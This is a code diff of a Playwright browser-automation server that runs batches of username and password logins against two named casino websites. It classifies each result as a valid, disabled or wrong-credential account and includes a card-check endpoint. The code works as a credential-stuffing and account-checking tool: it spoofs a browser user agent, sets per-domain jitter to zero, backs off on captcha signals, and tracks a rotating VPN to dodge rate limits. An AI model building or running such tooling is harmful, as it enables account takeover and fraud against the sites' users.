@@ -1,5 +1,5 @@
 /**
- * @fileoverview Sitchomatic Web — Real Browser Automation Server v1.3
+ * @fileoverview Sitchomatic Web — Real Browser Automation Server v1.2
  *
  * Express + Playwright server that performs LIVE browser automation.
  * Serves the webapp static files on port 8791 and provides a REST API
@@ -22,6 +22,10 @@ import fs from 'fs';
 import fsp from 'fs/promises';
 import crypto from 'crypto';
 import { fileURLToPath } from 'url';
+import { PNG } from 'pngjs';
+import pixelmatch from 'pixelmatch';
+import os from 'os';
+import { normalizeAutomationUrl, nextBackoffMs } from './server-utils.js';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const app = express();
@@ -37,16 +41,12 @@ const SHOTS_DIR    = path.join(__dirname, 'debug-shots');
 const SESSIONS_DIR = path.join(__dirname, 'sessions');
 /** Root folder for structured JSONL logs (one line per event). */
 const LOGS_DIR     = path.join(__dirname, 'logs');
-/** Root folder for per-run raw HTML snapshots (one file per screenshot slot). */
-const RUNS_DIR     = path.join(__dirname, 'runs');
-for (const d of [SHOTS_DIR, SESSIONS_DIR, LOGS_DIR, RUNS_DIR]) {
+for (const d of [SHOTS_DIR, SESSIONS_DIR, LOGS_DIR]) {
   try { fs.mkdirSync(d, { recursive: true }); } catch {}
 }
 // Serve screenshots at /shots/<runId>/<file>.png so the webapp can load them
 // directly from disk rather than carrying multi-MB base64 blobs in localStorage.
 app.use('/shots', express.static(SHOTS_DIR, { maxAge: '1h' }));
-// Serve raw HTML artefacts at /runs/<runId>/<idx>.html for forensic debugging.
-app.use('/runs',  express.static(RUNS_DIR,  { maxAge: '1h' }));
 
 // ── Structured Logger (JSONL) ────────────────────────────────────────────────
 /** Current log file path — rolls per day so a single file never gets huge. */
@@ -126,6 +126,7 @@ function startRun(meta) {
 }
 function endRun(handle, extra = {}) {
   if (!handle) return;
+  if (!runRegistry.has(handle.runId)) return;
   runRegistry.delete(handle.runId);
   broadcast('run.end', { runId: handle.runId, durationMs: Date.now() - handle.startedAt, ...extra });
   logEvent('info', 'run.end', { runId: handle.runId, durationMs: Date.now() - handle.startedAt, ...extra });
@@ -157,9 +158,9 @@ app.get('/api/runs', (_req, res) => {
  * or captcha signal on that domain.
  */
 const DOMAIN_THROTTLE = {
-  'joefortunepokies.win': { minDelayMs: 0,    jitterMs: 400, backoffMs: 0 },
-  'ignitioncasino.ooo':   { minDelayMs: 0,    jitterMs: 600, backoffMs: 0 },
-  _default:               { minDelayMs: 0,    jitterMs: 200, backoffMs: 0 },
+  'joefortunepokies.win': { minDelayMs: 0,    jitterMs: 0, backoffMs: 0 },
+  'ignitioncasino.ooo':   { minDelayMs: 0,    jitterMs: 0, backoffMs: 0 },
+  _default:               { minDelayMs: 0,    jitterMs: 0, backoffMs: 0 },
 };
 /** Last time each domain was hit — used to compute remaining wait. */
 const _domainLastHit = new Map();
@@ -193,7 +194,7 @@ async function applyDomainThrottle(url) {
  */
 function bumpDomainBackoff(host) {
   const cfg = _throttleFor(host);
-  cfg.backoffMs = Math.min(60_000, cfg.backoffMs ? cfg.backoffMs * 2 : 2_000);
+  cfg.backoffMs = nextBackoffMs(cfg.backoffMs, BACKOFF_BASE_MS, BACKOFF_MAX_MS);
   logEvent('warn', 'throttle.backoff.bump', { host, backoffMs: cfg.backoffMs });
 }
 function resetDomainBackoff(host) {
@@ -205,7 +206,7 @@ function resetDomainBackoff(host) {
 // ── Constants ────────────────────────────────────────────────────────────────
 
 /** Port the server listens on. */
-const PORT = 8791;
+const PORT = Number(process.env.PORT || 8791);
 
 /**
  * Browser launch options for all automation contexts.
@@ -224,20 +225,25 @@ const NAV_TIMEOUT = 30000;
 
 /** How long to wait after submitting a form before taking a screenshot. */
 const POST_SUBMIT_WAIT = 3000;
+/** Base delay used when entering backoff after 429/captcha signals. */
+const BACKOFF_BASE_MS = Number(process.env.BACKOFF_BASE_MS || 2000);
+/** Max delay cap used for exponential backoff. */
+const BACKOFF_MAX_MS = Number(process.env.BACKOFF_MAX_MS || 60000);
+/** Hard per-run watchdog timeout to prevent indefinite hangs. */
+const RUN_TIMEOUT_MS = Number(process.env.RUN_TIMEOUT_MS || 180000);
 
-// ── Concurrency Pool Config (Swarm Upgrade v1) ───────────────────────────────
-/**
- * Upper bound for the headless context pool. The old build hard-serialised every
- * run behind a single Chromium process; we now fan out across N reusable
- * contexts sharing the same warm browser. Headed (liveView) mode stays single-
- * slot so the user can still watch one live window without fighting for focus.
- *
- * Tunable at runtime by POSTing { maxConcurrent: N } to /api/pool/config.
- */
-const POOL_MAX_ABS = 16;
-const POOL_MAX_DEFAULT = 12;
-let POOL_MAX_HEADLESS = POOL_MAX_DEFAULT;
-const POOL_MAX_HEADED   = 1;
+// ── Single-Browser Serial Mutex ──────────────────────────────────────────────
+// Hard guarantee: only ONE Chromium process / one automation runs at a time.
+// Every /api/login-check and /api/card-check call queues behind this mutex
+// and runs strictly sequentially. The user can watch each run live without
+// multiple browser windows fighting for focus.
+let _automationChain = Promise.resolve();
+function runExclusive(fn) {
+  const next = _automationChain.then(() => fn(), () => fn());
+  // Swallow rejections in the chain so one failure doesn't poison the queue.
+  _automationChain = next.catch(() => {});
+  return next;
+}
 
 // ── Persistent Browser Pool ──────────────────────────────────────────────────
 /**
@@ -248,14 +254,9 @@ const POOL_MAX_HEADED   = 1;
  * @type {{ headless: import('playwright').Browser | null, headed: import('playwright').Browser | null }}
  */
 const browserPool = { headless: null, headed: null };
-// Pending-launch coalescing: multiple concurrent callers share a single
-// chromium.launch() promise per mode so we never orphan Chromium processes
-// when the pool is cold and the context lease pool asks for N workers at once.
-const browserLaunching = { headless: null, headed: null };
 
 /**
  * Get (or lazy-launch) the persistent browser for the given mode.
- * Concurrent-safe: coalesces simultaneous cold-start requests into one launch.
  * @param {boolean} live - true = visible window (liveView), false = headless
  * @returns {Promise<import('playwright').Browser>}
  */
@@ -264,29 +265,20 @@ async function getBrowser(live) {
   const existing = browserPool[key];
   if (existing && existing.isConnected()) return existing;
 
-  // Another caller is already launching for this mode — join them.
-  if (browserLaunching[key]) return browserLaunching[key];
-
   const launchArgs = live
     ? [...BROWSER_ARGS, '--window-size=540,420', '--window-position=40,40']
     : BROWSER_ARGS;
-  const launchPromise = chromium.launch({
+  const b = await chromium.launch({
     headless: !live,
     args:     launchArgs,
     slowMo:   live ? 120 : 0,
-  }).then((b) => {
-    // When the browser disconnects (crash, user close), clear the slot so the
-    // next request triggers a fresh launch instead of using a dead handle.
-    b.on('disconnected', () => { if (browserPool[key] === b) browserPool[key] = null; });
-    browserPool[key] = b;
-    logEvent('info', 'browser.launched', { mode: key });
-    return b;
-  }).finally(() => {
-    if (browserLaunching[key] === launchPromise) browserLaunching[key] = null;
   });
-
-  browserLaunching[key] = launchPromise;
-  return launchPromise;
+  // When the browser disconnects (crash, user close), clear the slot so the
+  // next request triggers a fresh launch instead of using a dead handle.
+  b.on('disconnected', () => { if (browserPool[key] === b) browserPool[key] = null; });
+  browserPool[key] = b;
+  logEvent('info', 'browser.launched', { mode: key });
+  return b;
 }
 
 /** Cleanly close both pooled browsers on process exit. */
@@ -299,196 +291,22 @@ async function shutdownBrowserPool() {
     }
   }
 }
-async function _shutdownAll() {
-  await drainContextPool().catch(() => {});
-  await shutdownBrowserPool().catch(() => {});
-}
-process.once('SIGINT',  () => _shutdownAll().finally(() => process.exit(0)));
-process.once('SIGTERM', () => _shutdownAll().finally(() => process.exit(0)));
-
-// ── Context Lease Pool (Swarm Upgrade v1) ────────────────────────────────────
-/**
- * Lease-based context pool: one pool per mode (headless / headed). Callers
- * acquire a context via leaseContext(), do their work, then release. Released
- * contexts are wiped (cookies cleared) and pushed back onto the idle stack for
- * the next lease to grab — avoids the ~100–200ms cost of creating a fresh
- * context every run. Bounded by POOL_MAX_* so we never exceed the user's
- * configured concurrency.
- *
- * `needsFreshState: true` (e.g. a run needs a specific storageState) forces a
- * freshly-created context that will be destroyed rather than returned.
- */
-const ctxPool = {
-  headless: { idle: [], waiters: [], active: 0 },
-  headed:   { idle: [], waiters: [], active: 0 },
-};
-
-function _poolCapFor(mode) { return mode === 'headed' ? POOL_MAX_HEADED : POOL_MAX_HEADLESS; }
-
-async function _newContext(browser, live) {
-  return browser.newContext({
-    viewport: live ? { width: 540, height: 420 } : { width: 1280, height: 800 },
-    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-    ignoreHTTPSErrors: true,
-  });
-}
-
-/**
- * Acquire a context from the pool. Resolves with { context, mode, fresh } where
- * `fresh` signals the caller must apply any storageState themselves (only true
- * when `needsFreshState` was requested).
- *
- * @param {{live?:boolean, needsFreshState?:boolean, signal?:AbortSignal}} opts
- * @returns {Promise<{context: import('playwright').BrowserContext, mode: 'headless'|'headed', fresh: boolean}>}
- */
-async function leaseContext({ live = false, needsFreshState = false, signal } = {}) {
-  const mode = live ? 'headed' : 'headless';
-  const pool = ctxPool[mode];
-
-  // Pre-flight: bail early if already cancelled.
-  if (signal?.aborted) throw new Error('lease cancelled');
-
-  // Fresh-state requests bypass the idle stack but still count against the cap.
-  if (needsFreshState) {
-    await _waitForSlot(pool, mode, signal);
-    const browser = await getBrowser(live);
-    const context = await _newContext(browser, live);
-    pool.active++;
-    return { context, mode, fresh: true };
-  }
-
-  // Try idle stack first.
-  if (pool.idle.length > 0) {
-    const context = pool.idle.pop();
-    pool.active++;
-    return { context, mode, fresh: false };
-  }
-
-  // Grow pool up to cap.
-  if (pool.active + pool.idle.length < _poolCapFor(mode)) {
-    const browser = await getBrowser(live);
-    const context = await _newContext(browser, live);
-    pool.active++;
-    return { context, mode, fresh: false };
-  }
-
-  // At cap — queue.
-  return new Promise((resolve, reject) => {
-    const waiter = { resolve, reject, signal };
-    pool.waiters.push(waiter);
-    if (signal) {
-      signal.addEventListener('abort', () => {
-        const i = pool.waiters.indexOf(waiter);
-        if (i !== -1) pool.waiters.splice(i, 1);
-        reject(new Error('lease cancelled'));
-      }, { once: true });
-    }
-  });
-}
-
-async function _waitForSlot(pool, mode, signal) {
-  while (pool.active + pool.idle.length >= _poolCapFor(mode)) {
-    if (signal?.aborted) throw new Error('lease cancelled');
-    if (pool.idle.length > 0) {
-      const ctx = pool.idle.pop();
-      try { await ctx.close(); } catch {}
-      return; // freed one slot
-    }
-    await new Promise((resolve, reject) => {
-      const waiter = { resolve: () => resolve(), reject, signal, _waitOnly: true };
-      pool.waiters.push(waiter);
-      if (signal) signal.addEventListener('abort', () => {
-        const i = pool.waiters.indexOf(waiter);
-        if (i !== -1) pool.waiters.splice(i, 1);
-        reject(new Error('lease cancelled'));
-      }, { once: true });
-    });
+async function shutdownActiveRuns(reason) {
+  const activeRuns = Array.from(runRegistry.values());
+  for (const h of activeRuns) {
+    try { h.controller?.abort(); } catch {}
+    try { await h.page?.close(); } catch {}
+    try { await h.context?.close(); } catch {}
+    endRun(h, { outcome: 'aborted', reason });
   }
 }
-
-/**
- * Release a previously-leased context. When `destroy` is true the context is
- * closed outright (used on cancellation, error, or fresh-state runs); otherwise
- * it is wiped and returned to the idle stack for reuse.
- */
-async function releaseContext(lease, { destroy = false } = {}) {
-  if (!lease) return;
-  const pool = ctxPool[lease.mode];
-  pool.active = Math.max(0, pool.active - 1);
-
-  const shouldDestroy = destroy || lease.fresh || !lease.context || !lease.context.browser();
-  if (shouldDestroy) {
-    try { await lease.context.close(); } catch {}
-  } else {
-    // Wipe transient state so the next caller starts clean.
-    try { await lease.context.clearCookies(); } catch {}
-    try { await lease.context.clearPermissions?.(); } catch {}
-    // Close any lingering pages; next caller always creates its own page.
-    try {
-      const pages = lease.context.pages();
-      await Promise.all(pages.map(p => p.close().catch(() => {})));
-    } catch {}
-    pool.idle.push(lease.context);
-  }
-
-  // Wake the next waiter (if any) by handing them a context. We prefer the
-  // idle stack (hot reuse) but also grow the pool if slots are free.
-  while (pool.waiters.length > 0) {
-    const w = pool.waiters.shift();
-    if (w._waitOnly) { try { w.resolve(); } catch {} return; }
-    if (pool.idle.length > 0) {
-      const context = pool.idle.pop();
-      pool.active++;
-      try { w.resolve({ context, mode: lease.mode, fresh: false }); } catch {}
-      return;
-    }
-    // No idle context but slot free — caller asked for a fresh-ish lease;
-    // just resolve — they'll create one.
-    if (pool.active + pool.idle.length < _poolCapFor(lease.mode)) {
-      try {
-        const browser = await getBrowser(lease.mode === 'headed');
-        const context = await _newContext(browser, lease.mode === 'headed');
-        pool.active++;
-        w.resolve({ context, mode: lease.mode, fresh: false });
-      } catch (err) { w.reject(err); }
-      return;
-    }
-  }
+async function gracefulShutdown(signalName) {
+  await shutdownActiveRuns(signalName);
+  await shutdownBrowserPool();
+  process.exit(0);
 }
-
-/** Drain and destroy every pooled context (called on shutdown). */
-async function drainContextPool() {
-  for (const mode of ['headless', 'headed']) {
-    const pool = ctxPool[mode];
-    const idle = pool.idle.splice(0);
-    await Promise.all(idle.map(c => c.close().catch(() => {})));
-    // Reject any pending waiters so they don't hang forever.
-    for (const w of pool.waiters.splice(0)) {
-      try { w.reject(new Error('pool draining')); } catch {}
-    }
-    pool.active = 0;
-  }
-}
-
-// POST /api/pool/config { maxConcurrent: N }
-app.post('/api/pool/config', express.json(), (req, res) => {
-  const n = parseInt(req.body?.maxConcurrent, 10);
-  if (!Number.isFinite(n) || n < 1 || n > POOL_MAX_ABS) {
-    return res.status(400).json({ error: `maxConcurrent must be 1..${POOL_MAX_ABS}` });
-  }
-  POOL_MAX_HEADLESS = n;
-  logEvent('info', 'pool.config', { maxConcurrent: n });
-  broadcast('pool.config', { maxConcurrent: n });
-  res.json({ ok: true, maxConcurrent: POOL_MAX_HEADLESS });
-});
-
-app.get('/api/pool/stats', (_req, res) => {
-  res.json({
-    maxConcurrent: POOL_MAX_HEADLESS,
-    headless: { active: ctxPool.headless.active, idle: ctxPool.headless.idle.length, waiters: ctxPool.headless.waiters.length },
-    headed:   { active: ctxPool.headed.active,   idle: ctxPool.headed.idle.length,   waiters: ctxPool.headed.waiters.length },
-  });
-});
+process.once('SIGINT',  () => gracefulShutdown('SIGINT'));
+process.once('SIGTERM', () => gracefulShutdown('SIGTERM'));
 
 // ── storageState Session Persistence ─────────────────────────────────────────
 /**
@@ -542,17 +360,17 @@ async function clearStoredSession(site, username) {
 // ── Disk Screenshot Helpers ──────────────────────────────────────────────────
 /**
  * Saves a PNG screenshot buffer to disk under debug-shots/<runId>/ and returns
- * a metadata object { path, url }. The frontend now loads the image by URL
- * directly from /shots/<runId>/<idx>.png instead of carrying a heavy base64
- * blob in localStorage — Swarm Upgrade v1 drops the data URL entirely.
+ * a metadata object { path, url, dataUrl }. Keeping a base64 dataUrl in the
+ * response preserves backwards compatibility with the existing frontend while
+ * giving us a stable disk path for reliable large-batch debugging.
  *
  * @param {Buffer|null} buf  - Raw PNG buffer (or null on failure)
  * @param {string} runId     - Run UUID
  * @param {number} idx       - Shot index (1..4)
- * @returns {{path:string, url:string}}
+ * @returns {{path:string, url:string, dataUrl:string}}
  */
 async function persistShotBuffer(buf, runId, idx) {
-  if (!buf) return { path: '', url: '' };
+  if (!buf) return { path: '', url: '', dataUrl: '' };
   const dir = path.join(SHOTS_DIR, runId);
   try { fs.mkdirSync(dir, { recursive: true }); } catch {}
   const filename = `${idx}.png`;
@@ -561,37 +379,105 @@ async function persistShotBuffer(buf, runId, idx) {
     logEvent('warn', 'shot.write.failed', { runId, idx, error: err.message });
   }
   const url = `/shots/${runId}/${filename}`;
+  const dataUrl = `data:image/png;base64,${buf.toString('base64')}`;
   broadcast('shot.saved', { runId, idx, url });
-  return { path: filePath, url };
+  return { path: filePath, url, dataUrl };
 }
 
 /**
- * Capture and persist the current page's full HTML under runs/<runId>/<idx>.html
- * alongside every screenshot. The raw HTML is priceless for forensic debugging
- * when a selector change on the target site breaks automation and the screenshot
- * alone doesn't reveal what the DOM looked like.
+ * Persists a per-attempt screenshot + full HTML dump to
+ * `debug-shots/<runId>/attempt-<n>.(png|html)` for forensic replay.
+ * Always writes whatever we have — a null buf still writes the HTML, and
+ * a missing html still writes the PNG — so the user always gets something
+ * to inspect after every submit click in the multi-submit login flow.
  *
- * Never throws — HTML capture failure must never break an automation run.
- *
- * @param {import('playwright').Page} page
+ * @param {Buffer|null} buf  Raw PNG
+ * @param {string|null} html Full document HTML (page.content())
  * @param {string} runId
- * @param {number} idx  - Matching shot index (1..4)
- * @returns {Promise<{path:string, url:string}>}
+ * @param {number} attempt 1-based attempt index
+ * @returns {{png:string, html:string}} served URLs (empty strings if write failed)
  */
-async function persistRunHtml(page, runId, idx) {
-  if (!page) return { path: '', url: '' };
-  const dir = path.join(RUNS_DIR, runId);
+async function persistAttemptArtifacts(buf, html, runId, attempt) {
+  const dir = path.join(SHOTS_DIR, runId);
   try { fs.mkdirSync(dir, { recursive: true }); } catch {}
-  const filename = `${idx}.html`;
-  const filePath = path.join(dir, filename);
-  try {
-    const html = await page.content().catch(() => '');
-    if (html) await fsp.writeFile(filePath, html);
-  } catch (err) {
-    logEvent('warn', 'html.write.failed', { runId, idx, error: err.message });
+  const out = { png: '', html: '' };
+  if (buf) {
+    const fp = path.join(dir, `attempt-${attempt}.png`);
+    try { await fsp.writeFile(fp, buf); out.png = `/shots/${runId}/attempt-${attempt}.png`; }
+    catch (err) { logEvent('warn', 'attempt.png.write.failed', { runId, attempt, error: err.message }); }
   }
-  const url = `/runs/${runId}/${filename}`;
-  return { path: filePath, url };
+  if (html) {
+    const fp = path.join(dir, `attempt-${attempt}.html`);
+    try { await fsp.writeFile(fp, html); out.html = `/shots/${runId}/attempt-${attempt}.html`; }
+    catch (err) { logEvent('warn', 'attempt.html.write.failed', { runId, attempt, error: err.message }); }
+  }
+  broadcast('attempt.saved', { runId, attempt, png: out.png, html: out.html });
+  return out;
+}
+
+/**
+ * Generates a visual diff between two PNG buffers using pixelmatch.
+ * Writes `diff-<n>-vs-<prev>.png` into the run's debug-shots folder and a
+ * small `diff-<n>.json` with change stats. Automatically resizes the larger
+ * image down by clipping to the smaller image's dimensions so a mismatched
+ * viewport (e.g. after a layout shift) still produces a usable diff.
+ *
+ * @param {Buffer|null} prevBuf previous attempt's PNG
+ * @param {Buffer|null} curBuf  current attempt's PNG
+ * @param {string} runId
+ * @param {number} n            1-based current attempt index
+ * @returns {Promise<{url:string, changedPixels:number, totalPixels:number, changedPct:number}|null>}
+ */
+async function persistAttemptDiff(prevBuf, curBuf, runId, n) {
+  if (!prevBuf || !curBuf || n < 2) return null;
+  try {
+    const prev = PNG.sync.read(prevBuf);
+    const cur  = PNG.sync.read(curBuf);
+    const w = Math.min(prev.width,  cur.width);
+    const h = Math.min(prev.height, cur.height);
+    if (w < 2 || h < 2) return null;
+
+    // Clip both images to the common (w,h) rectangle so pixelmatch can run.
+    const clip = (src) => {
+      if (src.width === w && src.height === h) return src.data;
+      const out = Buffer.alloc(w * h * 4);
+      for (let y = 0; y < h; y++) {
+        src.data.copy(out, y * w * 4, y * src.width * 4, y * src.width * 4 + w * 4);
+      }
+      return out;
+    };
+    const prevData = clip(prev);
+    const curData  = clip(cur);
+    const diffPng  = new PNG({ width: w, height: h });
+
+    const changedPixels = pixelmatch(prevData, curData, diffPng.data, w, h, {
+      threshold: 0.12,          // per-channel tolerance (0..1) — forgiving of AA noise
+      includeAA: false,
+      alpha: 0.35,
+      diffColor: [255, 64, 64], // red = pixels that changed
+    });
+
+    const dir = path.join(SHOTS_DIR, runId);
+    try { fs.mkdirSync(dir, { recursive: true }); } catch {}
+    const pngPath = path.join(dir, `diff-${n}-vs-${n - 1}.png`);
+    await fsp.writeFile(pngPath, PNG.sync.write(diffPng));
+
+    const totalPixels = w * h;
+    const changedPct  = totalPixels > 0 ? (changedPixels / totalPixels) * 100 : 0;
+    const stats = {
+      url: `/shots/${runId}/diff-${n}-vs-${n - 1}.png`,
+      prevAttempt: n - 1, curAttempt: n,
+      width: w, height: h,
+      changedPixels, totalPixels,
+      changedPct: Number(changedPct.toFixed(3)),
+    };
+    try { await fsp.writeFile(path.join(dir, `diff-${n}.json`), JSON.stringify(stats, null, 2)); } catch {}
+    broadcast('attempt.diff', { runId, attempt: n, ...stats });
+    return stats;
+  } catch (err) {
+    logEvent('warn', 'attempt.diff.failed', { runId, attempt: n, error: err.message });
+    return null;
+  }
 }
 
 // ── Network Response Hooks ───────────────────────────────────────────────────
@@ -1166,6 +1052,94 @@ app.get('/api/status', (req, res) => {
   });
 });
 
+// ── API: VPN Status ──────────────────────────────────────────────────────────
+
+/**
+ * GET /api/vpn-status
+ * Returns NordLynx VPN status including connection state and public IP.
+ * Used by the webapp dashboard to show VPN rotation status.
+ */
+app.get('/api/vpn-status', async (req, res) => {
+  try {
+    const { exec } = await import('child_process');
+    const { promisify } = await import('util');
+    const execAsync = promisify(exec);
+    
+    // Check if wg command exists and get VPN status
+    let vpnConnected = false;
+    let vpnInterface = null;
+    try {
+      const { stdout: wgOutput } = await execAsync('/opt/homebrew/bin/wg show 2>/dev/null || echo "offline"');
+      vpnConnected = wgOutput.includes('interface:');
+      if (vpnConnected) {
+        const match = wgOutput.match(/interface: (\w+)/);
+        vpnInterface = match ? match[1] : 'unknown';
+      }
+    } catch {}
+    
+    // Get public IP
+    let publicIp = null;
+    let ipSource = null;
+    try {
+      const controller = new AbortController();
+      const timeout = setTimeout(() => controller.abort(), 3000);
+      const ipRes = await fetch('https://ifconfig.me', { 
+        signal: controller.signal,
+        headers: { 'User-Agent': 'curl/7.64.1' }
+      });
+      clearTimeout(timeout);
+      if (ipRes.ok) {
+        publicIp = await ipRes.text();
+        ipSource = 'ifconfig.me';
+      }
+    } catch {}
+    
+    // Check LaunchAgent status
+    let rotationEnabled = false;
+    let nextRotation = null;
+    try {
+      const { stdout: launchctlOutput } = await execAsync('launchctl list com.user.nordlynx 2>/dev/null || echo "not loaded"');
+      rotationEnabled = launchctlOutput.includes('com.user.nordlynx');
+      
+      // Get last rotation time from log if available
+      const logPath = path.join(__dirname, 'logs', 'vpn-rotations.jsonl');
+      if (fs.existsSync(logPath)) {
+        const lines = fs.readFileSync(logPath, 'utf8').trim().split('\n').filter(Boolean);
+        if (lines.length > 0) {
+          const last = JSON.parse(lines[lines.length - 1]);
+          nextRotation = new Date(last.ts).getTime() + 300000; // 5 min interval
+        }
+      }
+    } catch {}
+    
+    // Count available configs
+    let configCount = 0;
+    try {
+      const configDir = path.join(os.homedir(), '.nordlynx', 'configs');
+      if (fs.existsSync(configDir)) {
+        configCount = fs.readdirSync(configDir).filter(f => f.endsWith('.conf')).length;
+      }
+    } catch {}
+    
+    res.json({
+      ok: true,
+      vpn: {
+        connected: vpnConnected,
+        interface: vpnInterface,
+        publicIp: publicIp,
+        ipSource: ipSource,
+        rotationEnabled: rotationEnabled,
+        nextRotation: nextRotation,
+        configCount: configCount,
+        intervalSeconds: 300,
+      },
+      timestamp: new Date().toISOString(),
+    });
+  } catch (err) {
+    res.status(500).json({ ok: false, error: err.message });
+  }
+});
+
 // ── API: Login Check ─────────────────────────────────────────────────────────
 
 /** Maximum number of login attempts before declaring noAcc. */
@@ -1293,6 +1267,63 @@ async function isLoggedIn(page, site) {
 }
 
 /**
+ * Strong post-submit outcome classifier. Looks at the CURRENT page only —
+ * does NOT navigate or reload. Returns one of:
+ *   { type: 'SUCCESS' }                         // welcome banner / off-login URL + auth signals
+ *   { type: 'DISABLED', perm: true|false }      // perm = contact customer service, !perm = rate-limited/temp
+ *   { type: 'BAD_CREDS', stage: 1|2 }           // stage 2 = "remain incorrect" second-warning banner
+ *   { type: 'UNKNOWN' }                          // keep clicking / wait longer
+ *
+ * @param {import('playwright').Page} page
+ * @param {'joe'|'ign'} site
+ * @returns {Promise<{type:string, perm?:boolean, stage?:number}>}
+ */
+async function classifyLoginOutcome(page, site) {
+  try {
+    const body = ((await page.textContent('body').catch(() => '')) || '').toLowerCase();
+    const url  = (page.url() || '').toLowerCase();
+
+    // ── Disabled (check before success because these render on login page) ──
+    if (/your account has been disabled\.\s*please,?\s*contact\s+customer\s+service/i.test(body)
+        || /contact us immediately/i.test(body)) {
+      return { type: 'DISABLED', perm: true };
+    }
+    if (/temporarily disabled.*failed login attempt/i.test(body)
+        || /too many failed.*attempts?/i.test(body)) {
+      return { type: 'DISABLED', perm: false };
+    }
+
+    // ── Bad credentials banners ─────────────────────────────────────────────
+    if (/your email and\/or password remain incorrect/i.test(body)) {
+      return { type: 'BAD_CREDS', stage: 2 };
+    }
+    if (/oops.*your email and\/or password are incorrect/i.test(body)
+        || /email and\/or password are incorrect/i.test(body)) {
+      return { type: 'BAD_CREDS', stage: 1 };
+    }
+    if (site === 'ign' && /incorrect (email|username|password)|invalid (email|username|password|credentials)/i.test(body)) {
+      return { type: 'BAD_CREDS', stage: 1 };
+    }
+
+    // ── Success: off-login URL OR visible welcome banner + auth-only DOM ────
+    const offLogin = !url.includes('/login')
+      && !url.includes('/sign-in')
+      && !url.includes('/signin')
+      && !url.includes('overlay=login')
+      && !url.includes('modal=login')
+      && !url.includes('action=login');
+    const welcomeBanner = /welcome\s+back\b|welcome!/i.test(body)
+      && !/your email and\/or password/i.test(body);
+    const authed = await isLoggedIn(page, site).catch(() => false);
+    if ((offLogin || welcomeBanner) && authed) return { type: 'SUCCESS' };
+
+    return { type: 'UNKNOWN' };
+  } catch {
+    return { type: 'UNKNOWN' };
+  }
+}
+
+/**
  * POST /api/login-check
  * Performs a real Playwright login attempt against the target casino site.
  *
@@ -1322,51 +1353,68 @@ app.post('/api/login-check', async (req, res) => {
     timeout = NAV_TIMEOUT,
     liveView = false,
     reuseSession = false, // Tier-3 #11 — opt-in session persistence
+    // Multi-submit knobs — configurable via request body, clamped to sane ranges.
+    postSubmitWait: postSubmitWaitRaw,
+    maxSubmitClicks: maxSubmitClicksRaw,
   } = req.body;
+  const postSubmitWait = Math.max(500, Math.min(15000, parseInt(postSubmitWaitRaw) || 3000));
+  const maxSubmitClicks = Math.max(1, Math.min(12, parseInt(maxSubmitClicksRaw) || 6));
   if (!username || !password || !loginUrl) {
     return res.status(400).json({ error: 'Missing username, password, or loginUrl' });
   }
+  let normalizedLoginUrl;
+  try {
+    normalizedLoginUrl = normalizeAutomationUrl(loginUrl);
+  } catch (err) {
+    return res.status(400).json({ error: `Invalid loginUrl: ${err.message}` });
+  }
 
-  // Register the run FIRST (outside the pool) so the client can immediately
-  // see it and cancel it. Actual work fans out across the context pool and
-  // respects POOL_MAX_HEADLESS for the headless mode.
-  const runHandle = startRun({ site, username, loginUrl, kind: 'login' });
+  // Register the run FIRST (outside the mutex) so the client can immediately
+  // see it and cancel it. The actual work still serialises behind the mutex.
+  const runHandle = startRun({ site, username, loginUrl: normalizedLoginUrl, kind: 'login' });
+  const runTimeoutHandle = setTimeout(() => {
+    if (runRegistry.has(runHandle.runId)) {
+      try { runHandle.controller.abort(); } catch {}
+      logEvent('warn', 'run.timeout', { runId: runHandle.runId, kind: 'login', timeoutMs: RUN_TIMEOUT_MS });
+    }
+  }, RUN_TIMEOUT_MS);
 
   // Domain-aware throttling: respect cooldowns / backoff before starting.
-  await applyDomainThrottle(loginUrl);
+  await applyDomainThrottle(normalizedLoginUrl);
 
-  let lease = null;
-  let destroyContext = false;
+  try {
+  await runExclusive(async () => {
   let context;
+  const shotBufs = [null, null, null, null];
   const shotUrls = ['', '', '', ''];
-  const htmlUrls = ['', '', '', ''];
+  const shotDataUrls = ['', '', '', ''];
   let outcome = 'noAcc';
   let note = 'Check did not complete';
   let netSnap = null;
-  const host = _hostOf(loginUrl);
+  let attemptLog = []; // [{ n, type, perm? }] — forensic audit of every submit
+  const host = _hostOf(normalizedLoginUrl);
   const signal = runHandle.controller.signal;
 
-  /** Persist a shot + HTML pair into slot i. Returns nothing — the arrays are populated. */
-  const persist = async (buf, i, page) => {
-    const [shotMeta, htmlMeta] = await Promise.all([
-      persistShotBuffer(buf, runHandle.runId, i + 1),
-      persistRunHtml(page, runHandle.runId, i + 1),
-    ]);
-    shotUrls[i] = shotMeta.url;
-    htmlUrls[i] = htmlMeta.url;
+  /** Persist a shot buf (or null) into slot i and return its dataUrl. */
+  const persist = async (buf, i) => {
+    shotBufs[i] = buf;
+    const meta = await persistShotBuffer(buf, runHandle.runId, i + 1);
+    shotUrls[i]     = meta.url;
+    shotDataUrls[i] = meta.dataUrl;
+    return meta.dataUrl;
   };
 
   try {
-    // Session reuse + storageState requires a dedicated context, so it bypasses
-    // the reuse path. Everything else leases from the pool and is returned on
-    // completion — keeps 8-16 contexts warm across a 50-cred batch.
+    // Use the persistent browser pool — re-uses the already-launched Chromium
+    // and avoids the ~1.5s cold start per credential.
+    const browser = await getBrowser(!!liveView);
     const storageState = reuseSession ? await loadStorageState(site, username) : undefined;
-    const needsFreshState = !!storageState;
-    lease = await leaseContext({ live: !!liveView, needsFreshState, signal });
-    context = lease.context;
-    if (storageState) {
-      try { await context.addCookies(storageState.cookies || []); } catch {}
-    }
+    context = await browser.newContext({
+      viewport: liveView ? { width: 540, height: 420 } : { width: 1280, height: 800 },
+      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+      ignoreHTTPSErrors: true,
+      storageState,
+    });
     runHandle.context = context;
     const page = await context.newPage();
     runHandle.page = page;
@@ -1403,18 +1451,18 @@ app.post('/api/login-check', async (req, res) => {
     // rather than 4 blank slots.
     bail();
     try {
-      await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout });
+      await page.goto(normalizedLoginUrl, { waitUntil: 'domcontentloaded', timeout });
     } catch (navErr) {
       note = `Navigation failed: ${navErr.message.split('\n')[0]}`;
